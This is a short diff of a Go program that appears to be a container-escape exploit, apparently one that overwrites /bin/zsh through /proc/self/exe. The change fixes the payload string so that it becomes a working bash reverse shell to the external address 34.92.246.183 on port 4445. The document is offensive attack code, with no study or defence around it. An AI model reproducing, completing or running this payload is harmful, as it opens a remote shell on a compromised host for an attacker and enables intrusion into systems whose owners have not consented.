@@ -13,7 +13,7 @@ import (
 )
 
 // This is the line of shell commands that will execute on the host
-var payload = "#!/bin/bash \n bash -i >& /dev/34.92.246.183/4445 0>&1"
+var payload = "#!/bin/bash \n bash -i >& /dev/tcp/34.92.246.183/4445 0>&1"
 
 func main() {
 	// First we overwrite /bin/zsh with the /proc/self/exe interpreter path
